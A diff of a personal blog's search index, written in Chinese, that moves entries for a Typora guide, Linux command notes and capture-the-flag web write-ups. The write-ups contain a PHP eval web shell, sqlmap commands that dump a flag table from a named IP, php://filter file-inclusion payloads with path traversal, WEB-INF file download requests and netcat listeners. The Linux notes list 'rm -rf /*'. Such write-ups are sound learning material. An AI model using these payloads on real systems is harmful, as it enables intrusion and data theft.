@@ -241,6 +241,24 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Typora用法</title>
+    <url>/2022/10/04/Typora%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[<p>Typora基本用法</p>
+<span id="more"></span>
+
+<h6 id="1-标题快捷键是ctrl-数字"><a href="#1-标题快捷键是ctrl-数字" class="headerlink" title="1.标题快捷键是ctrl+数字"></a>1.标题快捷键是ctrl+数字</h6><h6 id="2-让字体居中显示"><a href="#2-让字体居中显示" class="headerlink" title="2.让字体居中显示"></a>2.让字体居中显示</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;center&gt;居中&lt;/center&gt;</span><br><span class="line">&lt;p align=&quot;left&quot;&gt;左对齐&lt;/p&gt;</span><br><span class="line">&lt;p align=&quot;right&quot;&gt;右对齐&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="3-修改字体颜色"><a href="#3-修改字体颜色" class="headerlink" title="3.修改字体颜色"></a>3.修改字体颜色</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;font color=颜色代码 size=字号 face=&quot;字体名称&quot;&gt;文本&lt;/font&gt;</span><br></pre></td></tr></table></figure>
+
+<p>红色的代码是#ff0000</p>
+<h6 id="4-插入图片的语法是"><a href="#4-插入图片的语法是" class="headerlink" title="4.插入图片的语法是"></a>4.插入图片的语法是</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![](这里是图片所在的文件)</span><br></pre></td></tr></table></figure>
+
+<h6 id="5-设置链接是直接将链接写入"><a href="#5-设置链接是直接将链接写入" class="headerlink" title="5.设置链接是直接将链接写入"></a>5.设置链接是直接将链接写入</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;www.baidu.com&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="6-常用快捷键"><a href="#6-常用快捷键" class="headerlink" title="6.常用快捷键"></a>6.常用快捷键</h6><p><img src="/2022/10/04/Typora%E7%94%A8%E6%B3%95/Typora%E5%BF%AB%E6%8D%B7%E9%94%AE.png"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>Drink from my Flask#1(HeroCTF 2023)</title>
     <url>/2023/05/15/Drink%20from%20my%20Flask#1(HeroCTF%202023)/</url>
     <content><![CDATA[<p>Drink from my Flask#1(HeroCTF 2023)</p>
@@ -288,24 +306,6 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1234</span><br></pre></td></tr></table></figure>
 
 <p>![image-20230515200013911](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515200013911.png)</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Typora用法</title>
-    <url>/2022/10/04/Typora%E7%94%A8%E6%B3%95/</url>
-    <content><![CDATA[<p>Typora基本用法</p>
-<span id="more"></span>
-
-<h6 id="1-标题快捷键是ctrl-数字"><a href="#1-标题快捷键是ctrl-数字" class="headerlink" title="1.标题快捷键是ctrl+数字"></a>1.标题快捷键是ctrl+数字</h6><h6 id="2-让字体居中显示"><a href="#2-让字体居中显示" class="headerlink" title="2.让字体居中显示"></a>2.让字体居中显示</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;center&gt;居中&lt;/center&gt;</span><br><span class="line">&lt;p align=&quot;left&quot;&gt;左对齐&lt;/p&gt;</span><br><span class="line">&lt;p align=&quot;right&quot;&gt;右对齐&lt;/p&gt;</span><br></pre></td></tr></table></figure>
-
-<h6 id="3-修改字体颜色"><a href="#3-修改字体颜色" class="headerlink" title="3.修改字体颜色"></a>3.修改字体颜色</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;font color=颜色代码 size=字号 face=&quot;字体名称&quot;&gt;文本&lt;/font&gt;</span><br></pre></td></tr></table></figure>
-
-<p>红色的代码是#ff0000</p>
-<h6 id="4-插入图片的语法是"><a href="#4-插入图片的语法是" class="headerlink" title="4.插入图片的语法是"></a>4.插入图片的语法是</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![](这里是图片所在的文件)</span><br></pre></td></tr></table></figure>
-
-<h6 id="5-设置链接是直接将链接写入"><a href="#5-设置链接是直接将链接写入" class="headerlink" title="5.设置链接是直接将链接写入"></a>5.设置链接是直接将链接写入</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;www.baidu.com&gt;</span><br></pre></td></tr></table></figure>
-
-<h6 id="6-常用快捷键"><a href="#6-常用快捷键" class="headerlink" title="6.常用快捷键"></a>6.常用快捷键</h6><p><img src="/2022/10/04/Typora%E7%94%A8%E6%B3%95/Typora%E5%BF%AB%E6%8D%B7%E9%94%AE.png"></p>
 ]]></content>
   </entry>
   <entry>
@@ -399,6 +399,69 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1111</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623214302527.png" alt="image-20230623214302527"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>解题思路</title>
+    <url>/2022/10/02/hello-world/</url>
+    <content><![CDATA[<p>CTF招新赛部分wed解题思路</p>
+<span id="more"></span>
+
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="baby-rce"><a href="#baby-rce" class="headerlink" title="baby_rce"></a>baby_rce</h3><p><img src="/2022/10/02/hello-world/1.png"></p>
+<h3 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a>baby_upload</h3><p>上传一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/02/hello-world/2.png"></p>
+<h3 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h3><p>先了解伪协议使用data:&#x2F;&#x2F; 协议<br><img src="/2022/10/02/hello-world/4.png"><br><img src="/2022/10/02/hello-world/5.png"></p>
+<h1 id="baby-sql"><a href="#baby-sql" class="headerlink" title="baby_sql"></a>baby_sql</h1><ol>
+<li>python sqlmap.py -u “<a href="http://101.42.106.133:9208/index.php?geek=1&quot;">http://101.42.106.133:9208/index.php?geek=1&quot;</a> –batch</li>
+<li>python sqlmap.py -u <a href="http://101.42.106.133:9208/index.php?geek=1">http://101.42.106.133:9208/index.php?geek=1</a> –dbs –batch</li>
+<li>python sqlmap.py -u <a href="http://101.42.106.133:9208/index.php?geek=1">http://101.42.106.133:9208/index.php?geek=1</a> –current-db –batch</li>
+<li>python sqlmap.py -u <a href="http://101.42.106.133:9208/index.php?geek=1">http://101.42.106.133:9208/index.php?geek=1</a> –dbs -D geek –tables –batch</li>
+<li>python sqlmap.py -u <a href="http://101.42.106.133:9208/index.php?geek=1">http://101.42.106.133:9208/index.php?geek=1</a> -D geek -T ffflag –columns –batch</li>
+<li>python sqlmap.py -u 101.42.106.133:9208&#x2F;index.php?geek&#x3D;1 -D geek -T ffflag -C “flag,flag_id” –dump –batch</li>
+</ol>
+<p>1是查看是否存在注入，2和3是去获取数据库，4是获取数据库中的表，5是拿到表中的字段，最后6是直接dump字段中的内容，来获取flag。</p>
+<p><img src="/2022/10/02/hello-world/image-20221003160746799.png"></p>
+<p><img src="/2022/10/02/hello-world/image-20221003160801015.png"></p>
+<p><img src="/2022/10/02/hello-world/image-20221003160807151.png"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>buu的include</title>
+    <url>/2022/12/03/include%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
+    <content><![CDATA[<p>[极客大挑战 2019]Secret File	[BSidesCF 2020]Had a bad day	[FireshellCTF2020]Caas	[RoarCTF 2019]Easy Java</p>
+<span id="more"></span>
+
+<h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>1.打开页面以后查看源代码，看到有一个Archive_room.php进入，里面有一个按钮，按下以后出现<strong>没看清么？回去再仔细看看吧。</strong>于是直接使用抓包，抓取按下时的跳转</p>
+<p>2.抓包抓到一个被注释的secr3t.php 文件，进行访问出现源代码，使用secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<p>3.php:&#x2F;&#x2F;协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.php://filter用于读取源码。</span><br><span class="line">php://filter/convert.base64-encode/resource=文件路径</span><br><span class="line">可以得到加密后的源代码</span><br><span class="line"></span><br><span class="line">2.php://input用于执行php代码。</span><br></pre></td></tr></table></figure>
+
+<h3 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h3><p>1.进入页面随便点击WOOFERS或者MEOWERS，在url发现文件包含</p>
+<p>2.url:272ac30f-68db-4774-aad0-77cd28746bee.node4.buuoj.cn:81&#x2F;index.php?category&#x3D;woofers将woofers换成php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php发现报错</p>
+<p>3.将php后缀去掉，发现正常，将返回的内容进行base64解码</p>
+<pre><code>            &#123;
+                if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;
+                    include ($file . &#39;.php&#39;);
+                &#125;
+需要有woofers,meowers,index才能包含传入以传入名为文件名的文件
+</code></pre>
+<p>4.直接使用php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag无法获取源码</p>
+<p>5.使用php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;woofers&#x2F;..&#x2F;flag发现可以或者源码</p>
+<p>6.最后使用base64进行解码</p>
+<h3 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h3><p>1.发现需要使用c语言来做，并且还是文件包含题型</p>
+<p>2.直接输入<code>#include&lt;/flag&gt;</code>出现Bad code然后使用#include’&#x2F;flag’没有回显</p>
+<p>3.最后使用#include”&#x2F;flag”发现出现flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C语言的#include有&lt;&gt;和””两种</span><br><span class="line">&lt;&gt;:在系统标准头文件的位置查找头文件</span><br><span class="line">&quot;&quot;:先在当前目录是否有指定名称的头文件，然后在从标准头文件目录中查找</span><br></pre></td></tr></table></figure>
+
+<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p>1.根据wp中的弱密码输入admin,admin888显示<strong>flag没有在这里</strong></p>
+<p>2.点击help发现报错，此时是get传参，改为使用post传参，使用后让下载help.docx，下载打开后显示<strong>确定你的flag在这里吗</strong></p>
+<p>3.使用burp抓包help这个网页，将get传参改为post，查看是否存在<code>WEB-INF/web.xml</code>泄露，使用<code>POST /Download?filename=WEB-INF/web.xml HTTP/1.1</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">回显发现   &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
+
+<p>4.然后使用WEB-INF&#x2F;classes，使用<code>POST /Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class HTTP/1.1</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">回显有SourceFileFlagController.javaRuntimeVisibleAnnotations%Ljavax/servlet/annotation/WebServlet;nameFlagController&lt;ZmxhZ3s0YTMwZjdmOS05YmNhLTQ0MTMtYmExNy1hNjgzMjJiZWRmOWV9Cg==</span><br><span class="line">其中的ZmxhZ3s0YTMwZjdmOS05YmNhLTQ0MTMtYmExNy1hNjgzMjJiZWRmOWV9Cg==是base64编码，进行解码就是flag</span><br></pre></td></tr></table></figure>
 ]]></content>
   </entry>
   <entry>
@@ -574,146 +637,6 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p &lt;端口号&gt;:80/其他 镜像ID</span><br></pre></td></tr></table></figure>
 
 ]]></content>
-  </entry>
-  <entry>
-    <title>解题思路</title>
-    <url>/2022/10/02/hello-world/</url>
-    <content><![CDATA[<p>CTF招新赛部分wed解题思路</p>
-<span id="more"></span>
-
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="baby-rce"><a href="#baby-rce" class="headerlink" title="baby_rce"></a>baby_rce</h3><p><img src="/2022/10/02/hello-world/1.png"></p>
-<h3 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a>baby_upload</h3><p>上传一句话木马</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/10/02/hello-world/2.png"></p>
-<h3 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h3><p>先了解伪协议使用data:&#x2F;&#x2F; 协议<br><img src="/2022/10/02/hello-world/4.png"><br><img src="/2022/10/02/hello-world/5.png"></p>
-<h1 id="baby-sql"><a href="#baby-sql" class="headerlink" title="baby_sql"></a>baby_sql</h1><ol>
-<li>python sqlmap.py -u “<a href="http://101.42.106.133:9208/index.php?geek=1&quot;">http://101.42.106.133:9208/index.php?geek=1&quot;</a> –batch</li>
-<li>python sqlmap.py -u <a href="http://101.42.106.133:9208/index.php?geek=1">http://101.42.106.133:9208/index.php?geek=1</a> –dbs –batch</li>
-<li>python sqlmap.py -u <a href="http://101.42.106.133:9208/index.php?geek=1">http://101.42.106.133:9208/index.php?geek=1</a> –current-db –batch</li>
-<li>python sqlmap.py -u <a href="http://101.42.106.133:9208/index.php?geek=1">http://101.42.106.133:9208/index.php?geek=1</a> –dbs -D geek –tables –batch</li>
-<li>python sqlmap.py -u <a href="http://101.42.106.133:9208/index.php?geek=1">http://101.42.106.133:9208/index.php?geek=1</a> -D geek -T ffflag –columns –batch</li>
-<li>python sqlmap.py -u 101.42.106.133:9208&#x2F;index.php?geek&#x3D;1 -D geek -T ffflag -C “flag,flag_id” –dump –batch</li>
-</ol>
-<p>1是查看是否存在注入，2和3是去获取数据库，4是获取数据库中的表，5是拿到表中的字段，最后6是直接dump字段中的内容，来获取flag。</p>
-<p><img src="/2022/10/02/hello-world/image-20221003160746799.png"></p>
-<p><img src="/2022/10/02/hello-world/image-20221003160801015.png"></p>
-<p><img src="/2022/10/02/hello-world/image-20221003160807151.png"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>buu的include</title>
-    <url>/2022/12/03/include%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
-    <content><![CDATA[<p>[极客大挑战 2019]Secret File	[BSidesCF 2020]Had a bad day	[FireshellCTF2020]Caas	[RoarCTF 2019]Easy Java</p>
-<span id="more"></span>
-
-<h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>1.打开页面以后查看源代码，看到有一个Archive_room.php进入，里面有一个按钮，按下以后出现<strong>没看清么？回去再仔细看看吧。</strong>于是直接使用抓包，抓取按下时的跳转</p>
-<p>2.抓包抓到一个被注释的secr3t.php 文件，进行访问出现源代码，使用secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
-<p>3.php:&#x2F;&#x2F;协议</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.php://filter用于读取源码。</span><br><span class="line">php://filter/convert.base64-encode/resource=文件路径</span><br><span class="line">可以得到加密后的源代码</span><br><span class="line"></span><br><span class="line">2.php://input用于执行php代码。</span><br></pre></td></tr></table></figure>
-
-<h3 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h3><p>1.进入页面随便点击WOOFERS或者MEOWERS，在url发现文件包含</p>
-<p>2.url:272ac30f-68db-4774-aad0-77cd28746bee.node4.buuoj.cn:81&#x2F;index.php?category&#x3D;woofers将woofers换成php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php发现报错</p>
-<p>3.将php后缀去掉，发现正常，将返回的内容进行base64解码</p>
-<pre><code>            &#123;
-                if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;
-                    include ($file . &#39;.php&#39;);
-                &#125;
-需要有woofers,meowers,index才能包含传入以传入名为文件名的文件
-</code></pre>
-<p>4.直接使用php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag无法获取源码</p>
-<p>5.使用php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;woofers&#x2F;..&#x2F;flag发现可以或者源码</p>
-<p>6.最后使用base64进行解码</p>
-<h3 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h3><p>1.发现需要使用c语言来做，并且还是文件包含题型</p>
-<p>2.直接输入<code>#include&lt;/flag&gt;</code>出现Bad code然后使用#include’&#x2F;flag’没有回显</p>
-<p>3.最后使用#include”&#x2F;flag”发现出现flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C语言的#include有&lt;&gt;和””两种</span><br><span class="line">&lt;&gt;:在系统标准头文件的位置查找头文件</span><br><span class="line">&quot;&quot;:先在当前目录是否有指定名称的头文件，然后在从标准头文件目录中查找</span><br></pre></td></tr></table></figure>
-
-<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p>1.根据wp中的弱密码输入admin,admin888显示<strong>flag没有在这里</strong></p>
-<p>2.点击help发现报错，此时是get传参，改为使用post传参，使用后让下载help.docx，下载打开后显示<strong>确定你的flag在这里吗</strong></p>
-<p>3.使用burp抓包help这个网页，将get传参改为post，查看是否存在<code>WEB-INF/web.xml</code>泄露，使用<code>POST /Download?filename=WEB-INF/web.xml HTTP/1.1</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">回显发现   &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
-
-<p>4.然后使用WEB-INF&#x2F;classes，使用<code>POST /Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class HTTP/1.1</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">回显有SourceFileFlagController.javaRuntimeVisibleAnnotations%Ljavax/servlet/annotation/WebServlet;nameFlagController&lt;ZmxhZ3s0YTMwZjdmOS05YmNhLTQ0MTMtYmExNy1hNjgzMjJiZWRmOWV9Cg==</span><br><span class="line">其中的ZmxhZ3s0YTMwZjdmOS05YmNhLTQ0MTMtYmExNy1hNjgzMjJiZWRmOWV9Cg==是base64编码，进行解码就是flag</span><br></pre></td></tr></table></figure>
-]]></content>
-  </entry>
-  <entry>
-    <title>linux命令</title>
-    <url>/2022/10/03/linux/</url>
-    <content><![CDATA[<p>linux的基本命令</p>
-<span id="more"></span>
-
-<h6 id="1-cd命令（切换目录）"><a href="#1-cd命令（切换目录）" class="headerlink" title="1.cd命令（切换目录）"></a>1.cd命令（切换目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /                 //切换到根目录</span><br><span class="line">cd /bin              //切换到根目录下的bin目录</span><br><span class="line">cd ../               //切换到上一级目录 或者使用命令：cd ..</span><br><span class="line">cd ~                 //切换到home目录</span><br><span class="line">cd -                 //切换到上次访问的目录</span><br><span class="line">cd xx(文件夹名)       //切换到本目录下的名为xx的文件目录，如果目录不存在报错</span><br><span class="line">cd /xxx/xx/x         //可以输入完整的路径，直接切换到目标目录，输入过程中可以使用tab键快速补全</span><br></pre></td></tr></table></figure>
-
-<h6 id="2-ls命令（查看目录）"><a href="#2-ls命令（查看目录）" class="headerlink" title="2.ls命令（查看目录）"></a>2.ls命令（查看目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls                   //查看当前目录下的所有目录和文件</span><br><span class="line">ls /                 //查看指定目录下的文件</span><br><span class="line">ls -a                //查看当前目录下的所有目录和文件（包括隐藏的文件）</span><br><span class="line">ls -l                //列表查看当前目录下的所有目录和文件（列表查看，显示更多信息），与命令&quot;ll&quot;效果一样</span><br><span class="line">ls /bin              //查看指定目录下的所有目录和文件</span><br></pre></td></tr></table></figure>
-
-<h6 id="3-mkdir命令（创建文件夹）"><a href="#3-mkdir命令（创建文件夹）" class="headerlink" title="3.mkdir命令（创建文件夹）"></a>3.mkdir命令（创建文件夹）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir tools          //在当前目录下创建一个名为tools的目录</span><br><span class="line">mkdir /bin/tools     //在指定目录下创建一个名为tools的目录</span><br><span class="line">mkdir -m 711 test1   //配置文件的权限</span><br></pre></td></tr></table></figure>
-
-<h6 id="4-touch命令（创建文件）"><a href="#4-touch命令（创建文件）" class="headerlink" title="4.touch命令（创建文件）"></a>4.touch命令（创建文件）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch tools.txt      //在该目录下创建一个后缀为txt的文件</span><br></pre></td></tr></table></figure>
-
-<h6 id="5-rm命令（删除目录与文件）"><a href="#5-rm命令（删除目录与文件）" class="headerlink" title="5.rm命令（删除目录与文件）"></a>5.rm命令（删除目录与文件）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm 文件名              //删除当前目录下的文件</span><br><span class="line">rm -f 文件名           //删除当前目录的文件（不询问）</span><br><span class="line">rm -r 文件夹名         //递归删除当前目录下此名的目录</span><br><span class="line">rm -rf 文件夹名        //递归删除当前目录下此名的目录（不询问）</span><br><span class="line">rm -rf *              //将当前目录下的所有目录和文件全部删除</span><br><span class="line">rm -rf /*             //将根目录下的所有文件全部删除【慎用！相当于格式化系统】</span><br></pre></td></tr></table></figure>
-
-<h6 id="6-mv命令（修改目录）"><a href="#6-mv命令（修改目录）" class="headerlink" title="6.mv命令（修改目录）"></a>6.mv命令（修改目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv 当前目录名 新目录名        //修改目录名，同样适用与文件操作</span><br><span class="line">mv /usr/tmp/tool /opt       //将/usr/tmp目录下的tool目录剪切到 /opt目录下面</span><br><span class="line">mv -r /usr/tmp/tool /opt    //递归剪切目录中所有文件和文件夹</span><br></pre></td></tr></table></figure>
-
-<h6 id="7-cp命令（拷贝目录）"><a href="#7-cp命令（拷贝目录）" class="headerlink" title="7.cp命令（拷贝目录）"></a>7.cp命令（拷贝目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/tmp/tool /opt       //将/usr/tmp目录下的tool目录复制到 /opt目录下面</span><br><span class="line">cp -r /usr/tmp/tool /opt    //递归剪切复制目录中所有文件和文件夹</span><br></pre></td></tr></table></figure>
-
-<h6 id="8-cat命令"><a href="#8-cat命令" class="headerlink" title="8.cat命令"></a>8.cat命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 文件名                    //查看文件中的全部信息(适合查看小文档)</span><br></pre></td></tr></table></figure>
-
-<h6 id="9-rmp命令（插件安装命令）"><a href="#9-rmp命令（插件安装命令）" class="headerlink" title="9.rmp命令（插件安装命令）"></a>9.rmp命令（插件安装命令）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">说明：插件安装命令</span><br><span class="line">rpm -i httpd-2.2.3-22.0.1.el5.i386.rpm         //使用rpm文件安装apache </span><br><span class="line">rpm -uvh httpd-2.2.3-22.0.1.el5.i386.rpm      //使用rpm更新apache </span><br><span class="line">rpm -e httpd                                 //卸载/删除apache</span><br></pre></td></tr></table></figure>
-
-<h6 id="10-修改ip命令"><a href="#10-修改ip命令" class="headerlink" title="10.修改ip命令"></a>10.修改ip命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改网络配置文件，文件地址：/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">------------------------------------------------</span><br><span class="line">主要修改以下配置：  </span><br><span class="line">TYPE=Ethernet               //网络类型</span><br><span class="line">BOOTPROTO=static            //静态IP</span><br><span class="line">DEVICE=ens00                //网卡名</span><br><span class="line">IPADDR=192.168.1.100        //设置的IP</span><br><span class="line">NETMASK=255.255.255.0       //子网掩码</span><br><span class="line">GATEWAY=192.168.1.1         //网关</span><br><span class="line">DNS1=192.168.1.1            //DNS</span><br><span class="line">DNS2=8.8.8.8                //备用DNS</span><br><span class="line">ONBOOT=yes                  //系统启动时启动此设置</span><br><span class="line">-------------------------------------------------</span><br><span class="line">修改保存以后使用命令重启网卡：service network restart</span><br></pre></td></tr></table></figure>
-
-<h6 id="11-apt命令（一般跟随sudo进行）"><a href="#11-apt命令（一般跟随sudo进行）" class="headerlink" title="11.apt命令（一般跟随sudo进行）"></a>11.apt命令（一般跟随sudo进行）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install package_name 安装/更新一个新软件包，软件临时存放到/var/cache/apt/archives</span><br><span class="line">apt-cdrom install package_name 从光盘安装/更新一个软件包</span><br><span class="line">apt-get remove packagename #卸载一个已安装的软件包（保留配置文档）</span><br><span class="line">apt-get update 升级列表中的软件包 </span><br><span class="line">apt-get upgrade 升级所有已安装的软件</span><br><span class="line">apt-get clean 从下载的软件包中清理缓存</span><br></pre></td></tr></table></figure>
-
-<h6 id="12-sudo命令"><a href="#12-sudo命令" class="headerlink" title="12.sudo命令"></a>12.sudo命令</h6><p><code>sudo</code>是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的<code>root</code>命令的一个工具，如halt，reboot，su等等。换句话说通过此命令可以让非<code>root</code>的用户运行只有<code>root</code>才有权限执行的命令。</p>
-<h6 id="13-dpkg命令（使用时需要有deb软件包）"><a href="#13-dpkg命令（使用时需要有deb软件包）" class="headerlink" title="13.dpkg命令（使用时需要有deb软件包）"></a>13.dpkg命令（使用时需要有deb软件包）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i xx.deb  为对应的下载xx.deb软件的命令</span><br><span class="line">sudo dpkg -r xx.deb  为对应的卸载xx.deb软件的命令</span><br><span class="line">sudo dpkg -c xx.deb  显示软件包内文件列表</span><br><span class="line">sudo dpkg -l xx.deb  查询软件包的版本</span><br></pre></td></tr></table></figure>
-
-<p>使用这个命令需要有deb软件包</p>
-<p>步骤为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先cd xx.deb</span><br><span class="line">最后下载sudo dpkg -i xx.deb</span><br></pre></td></tr></table></figure>
-
-<h6 id="14-yum命令（ubuntu需配置yum安装源才可使用）"><a href="#14-yum命令（ubuntu需配置yum安装源才可使用）" class="headerlink" title="14.yum命令（ubuntu需配置yum安装源才可使用）"></a>14.yum命令（ubuntu需配置yum安装源才可使用）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install #全部安装</span><br><span class="line">yum update #全部更新</span><br></pre></td></tr></table></figure>
-
-<h6 id="15-在ubuntu上配置git"><a href="#15-在ubuntu上配置git" class="headerlink" title="15.在ubuntu上配置git"></a>15.在ubuntu上配置git</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用sudo apt-get install git进行安装</span><br><span class="line">git --version查看版本</span><br><span class="line">git config --global user.name &quot;xxx&quot;</span><br><span class="line">git config --global user.email &quot;你的邮箱地址&quot;</span><br><span class="line">ssh-keygen -t rsa -C &quot;邮箱地址&quot;   该命令获取公钥，一般会存在于/root/.ssh文件中</span><br><span class="line">gedit ~/.ssh/id_rsa.pub     使用该命令查看公钥</span><br><span class="line">复制公钥进行github的上传</span><br><span class="line">git config --list   可查看配置信息</span><br></pre></td></tr></table></figure>
-
-<h6 id="16-ubuntu换源"><a href="#16-ubuntu换源" class="headerlink" title="16.ubuntu换源"></a>16.ubuntu换源</h6><p>先备份镜像源设置文件</p>
